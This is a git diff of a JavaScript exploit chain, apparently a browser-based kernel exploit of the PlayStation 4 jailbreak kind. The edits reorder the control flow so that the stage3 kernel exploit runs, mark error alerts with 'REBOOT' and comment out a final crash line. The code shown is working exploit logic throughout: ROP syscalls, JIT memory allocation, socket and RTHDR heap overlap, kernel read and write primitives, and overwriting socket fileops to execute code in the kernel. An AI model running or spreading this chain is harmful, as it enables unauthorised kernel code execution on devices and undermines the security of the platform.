@@ -207,7 +207,13 @@ function stage2() {
   }
   p.write8(kstr, orig_kview_buf);
   chain = new rop();
-  if (chain.syscall(23, 0).low == 0x0) {
+  if (chain.syscall(23, 0).low != 0x0) {
+    try {
+      stage3();
+    } catch (e) {
+      alert(e);
+    }
+  } 
     
     var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
@@ -285,13 +291,7 @@ function stage2() {
     });
     loader_thr();
     alert("waiting for payload");
-  } else {
-    try {
-      stage3();
-    } catch (e) {
-      alert(e);
-    }
-  }
+  
 }
 
 function stage3() {
@@ -541,7 +541,7 @@ function stage3() {
         return;
       }
     }
-    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
+    alert("[ERROR] -> failed to find socket overlap. (should be unreachable) REBOOT");
     while (1) {};
   }
 
@@ -590,7 +590,7 @@ function stage3() {
       overlapped_socket = leak_sockets[overlapped_socket_idx];
       return;
     }
-    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
+    alert("[ERROR] failed to find RTHDR <-> master socket overlap REBOOT");
     while (1) {};
 
   }
@@ -639,7 +639,7 @@ function stage3() {
         return;
       }
     }
-    alert("[ERROR] failed to find slave");
+    alert("[ERROR] failed to find slave REBOOT");
     while (1) {};
   }
 
@@ -680,7 +680,7 @@ function stage3() {
       }
       attempt.sub32inplace(0x01000000);
     }
-    alert("[ERROR] failed to find kernel_map");
+    alert("[ERROR] failed to find kernel_map REBOOT");
     while (1) {};
   }
 
@@ -693,7 +693,7 @@ function stage3() {
       }
       proc = kernel_read8(proc);
     }
-    alert("[ERROR] failed to find proc");
+    alert("[ERROR] failed to find proc REBOOT");
     while (1) {};
   }
 
@@ -729,7 +729,7 @@ function stage3() {
   var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
   chain.syscall(324, 1);
   if(exec_address.low != 0x90000000) {
-      alert("[ERROR] failed to allocate jit memory");
+      alert("[ERROR] failed to allocate jit memory REBOOT");
       while(1){};
   }
   var exec_writer = p.array_from_address(write_address, 0x4000);
@@ -739,7 +739,7 @@ function stage3() {
   exec_writer[0x200] = 0x37C0C748;
   exec_writer[0x201] = 0xC3000013;
   if(chain.call(exec_address).low != 0x1337) {
-      alert("[ERROR] hmm weird");
+      alert("[ERROR] hmm weird REBOOT");
       while(1){};
   }
 
@@ -848,8 +848,8 @@ function stage3() {
   p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
   kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
   chain.syscall(54, target_socket, 0x20001111, 0);
-  alert("executed in kernel");
-  p.write8(0, 0);
+  //alert("executed in kernel");
+  //p.write8(0, 0);
 }
 /*
     - assemble & take every 4 bytes, byteswap and assign them to exec_writer
